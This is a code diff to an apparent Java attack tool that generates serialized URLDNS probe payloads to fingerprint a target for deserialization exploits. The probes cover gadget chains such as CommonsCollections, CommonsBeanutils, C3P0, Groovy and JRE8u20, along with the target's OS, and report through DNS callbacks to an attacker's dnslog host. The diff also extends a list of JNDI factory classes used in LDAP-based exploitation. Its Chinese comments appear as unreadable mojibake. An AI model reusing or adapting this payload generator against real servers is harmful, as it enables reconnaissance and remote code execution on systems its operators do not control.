@@ -16,13 +16,13 @@ public class en {
 	static String dnslog;
 	static String[] defaultclass = {"CommonsCollections13567",
   				"CommonsCollections24",
-  				"CommonsBeanutils2",
-				"C3P0",
+  				"CommonsBeanutils2","C3P0",
   				"AspectJWeaver",
   				"bsh",
   				"Groovy",
   				"Becl",
   				"Jdk7u21",
+  				"JRE8u20",
   				"winlinux"};
 	static String[] jndidefaultclass = {"javax.el.ELProcessor",
 			"org.apache.naming.factory.BeanFactory",
@@ -38,7 +38,9 @@ public class en {
 			"org.apache.commons.dbcp2.BasicDataSourceFactory",
 			"org.apache.commons.dbcp.BasicDataSourceFactory",
 			"org.apache.tomcat.jdbc.pool.DataSourceFactory",
-			"com.alibaba.druid.pool.DruidDataSourceFactory"};
+			"com.alibaba.druid.pool.DruidDataSourceFactory",
+			"com.ibm.ws.client.applicationclient.ClientJ2CCFFactory",
+			"com.ibm.ws.webservices.engine.client.ServiceFactory"};
 	
 	
     public static void main(String act, String clazzs, String dns) throws Exception {
@@ -63,7 +65,6 @@ public class en {
   			}
   	    	ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("1.ser"));
   	    	oos.writeObject(list);
-  	    	
 		}else if(act.equals("ldap")){
   	  		for (Iterator iterator = arraylistclazz.iterator(); iterator.hasNext();) {
   				String clazz = (String) iterator.next();
@@ -85,21 +86,21 @@ public class en {
     public static  void setlist(String clazzName) throws Exception{
     	switch (clazzName) {
 		case "CommonsCollections13567":
-	    	//CommonsCollections1/3/5/6/7Èìæ,ÈúÄË¶Å<=3.2.1ÁâàÊú¨
-	    	HashMap cc31321 = getURLDNSgadget("http://cc31321."+dnslog, "org.apache.commons.collections.functors.ChainedTransformer");
+	    	//CommonsCollections1/3/5/6/7¡¥,–Ë“™<=3.2.1∞Ê±æ
+	    	HashMap cc31or321 = getURLDNSgadget("http://cc31or321."+dnslog, "org.apache.commons.collections.functors.ChainedTransformer");
 	    	HashMap cc322 = getURLDNSgadget("http://cc322."+dnslog, "org.apache.commons.collections.ExtendedProperties$1");
-	  		list.add(cc31321);
+	  		list.add(cc31or321);
 	  		list.add(cc322);
 			break;
 		case "CommonsCollections24":
-	    	//CommonsCollections2/4Èìæ,ÈúÄË¶Å4-4.0ÁâàÊú¨
+	    	//CommonsCollections2/4¡¥,–Ë“™4-4.0∞Ê±æ
 	    	HashMap cc40 = getURLDNSgadget("http://cc40."+dnslog,  "org.apache.commons.collections4.functors.ChainedTransformer");
 	    	HashMap cc41 = getURLDNSgadget("http://cc41."+dnslog,  "org.apache.commons.collections4.FluentIterable");
 	  		list.add(cc40);
 	  		list.add(cc41);
 			break;
 		case "CommonsBeanutils2":
-	    	//CommonsBeanutils2Èìæ,serialVersionUID‰∏çÂêå,1.7x-1.8x‰∏∫-3490850999041592962,1.9x‰∏∫-2044202215314119608
+	    	//CommonsBeanutils2¡¥,serialVersionUID≤ªÕ¨,1.7x-1.8xŒ™-3490850999041592962,1.9xŒ™-2044202215314119608
 			HashMap cb17 = getURLDNSgadget("http://cb17."+dnslog, "org.apache.commons.beanutils.MappedPropertyDescriptor$1");
 	    	HashMap cb18x = getURLDNSgadget("http://cb18x."+dnslog, "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry");
 	    	HashMap cb19x = getURLDNSgadget("http://cb19x."+dnslog, "org.apache.commons.beanutils.BeanIntrospectionData");
@@ -108,19 +109,19 @@ public class en {
 	  		list.add(cb19x);
 			break;
 		case "C3P0":
-	    	//c3p0ÔºåserialVersionUID‰∏çÂêå,0.9.2pre2-0.9.5pre8‰∏∫7387108436934414104,0.9.5pre9-0.9.5.5‰∏∫7387108436934414104
+	    	//c3p0£¨serialVersionUID≤ªÕ¨,0.9.2pre2-0.9.5pre8Œ™7387108436934414104,0.9.5pre9-0.9.5.5Œ™7387108436934414104
 	    	HashMap c3p092x = getURLDNSgadget("http://c3p092x."+dnslog, "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
 	    	HashMap c3p095x = getURLDNSgadget("http://c3p095x."+dnslog, "com.mchange.v2.c3p0.test.AlwaysFailDataSource");
 	  		list.add(c3p092x);
 	  		list.add(c3p095x);
 			break;
 		case "AspectJWeaver":
-	    	//AspectJWeaver,ÈúÄË¶Åcc31
+	    	//AspectJWeaver,–Ë“™cc31
 	    	HashMap ajw = getURLDNSgadget("http://ajw."+dnslog, "org.aspectj.weaver.tools.cache.SimpleCache");
 	  		list.add(ajw);
 			break;
 		case "bsh":
-	  		//bsh,serialVersionUID‰∏çÂêå,2.0b4‰∏∫4949939576606791809,2.0b5‰∏∫4041428789013517368,2.0.b6Êó†Ê≥ïÂèçÂ∫èÂàóÂåñ
+	  		//bsh,serialVersionUID≤ªÕ¨,2.0b4Œ™4949939576606791809,2.0b5Œ™4041428789013517368,2.0.b6Œﬁ∑®∑¥–Ú¡–ªØ
 	  		HashMap bsh20b4 = getURLDNSgadget("http://bsh20b4."+dnslog, "bsh.CollectionManager$1");
 	  		HashMap bsh20b5 = getURLDNSgadget("http://bsh20b5."+dnslog, "bsh.engine.BshScriptEngine");
 	  		HashMap bsh20b6 = getURLDNSgadget("http://bsh20b6."+dnslog, "bsh.collection.CollectionIterator$1");
@@ -129,7 +130,7 @@ public class en {
 	  		list.add(bsh20b6);
 			break;
 		case "Groovy":
-	  		//Groovy,1.7.0-2.4.3,serialVersionUID‰∏çÂêå,2.4.x‰∏∫-8137949907733646644,2.3.x‰∏∫1228988487386910280
+	  		//Groovy,1.7.0-2.4.3,serialVersionUID≤ªÕ¨,2.4.xŒ™-8137949907733646644,2.3.xŒ™1228988487386910280
 	  		HashMap groovy1702311 = getURLDNSgadget("http://groovy1702311."+dnslog, "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet");
 	  		HashMap groovy24x = getURLDNSgadget("http://groovy24x."+dnslog, "groovy.lang.Tuple2");
 	  		HashMap groovy244 = getURLDNSgadget("http://groovy244."+dnslog, "org.codehaus.groovy.runtime.dgm$1170");
@@ -143,12 +144,17 @@ public class en {
 	  		list.add(becl);
 			break;
 		case "Jdk7u21":
-	  		//JDK<=Jdk7u21
+	  		//JDK<=7u21
 	  		HashMap Jdk7u21 = getURLDNSgadget("http://Jdk7u21."+dnslog, "com.sun.corba.se.impl.orbutil.ORBClassLoader");
 	  		list.add(Jdk7u21);
 			break;
+		case "JRE8u20":
+	  		//7u25<=JDK<=8u20,À‰»ªΩ–JRE8u20∆‰ µJDK8u20“≤ø…“‘,’‚∏ˆºÏ≤‚≤ªÕÍ√¿,8u25∞Ê±æ“‘º∞JDK<=7u21ª·ŒÛ±®,ø…◊€∫œJdk7u21¿¥ø¥
+	  		HashMap JRE8u20 = getURLDNSgadget("http://JRE8u20."+dnslog, "javax.swing.JComponent$2");
+	  		list.add(JRE8u20);
+			break;
 		case "winlinux":
-	  		//windows/linuxÁâàÊú¨Âà§Êñ≠
+	  		//windows/linux∞Ê±æ≈–∂œ
 	  		HashMap linux = getURLDNSgadget("http://linux."+dnslog, "sun.awt.X11.AwtGraphicsConfigData");
 	  		HashMap windows = getURLDNSgadget("http://windows."+dnslog, "sun.awt.windows.WButtonPeer");
 	  		list.add(linux);
@@ -182,7 +188,7 @@ public class en {
   		try {
   			hashMap.put(url, makeClass(clazzName));
 		} catch (Exception e) {
-			System.out.println("ÈîôËØØÔºÅÔºÅÔºÅ‰∏çËÉΩ‰ª•javaÂºÄÂ§¥");
+			System.out.println("¥ÌŒÛ£°£°£°≤ªƒ‹“‘javaø™Õ∑");
 			System.out.println(e);
 		}
   		f.set(url, -1);
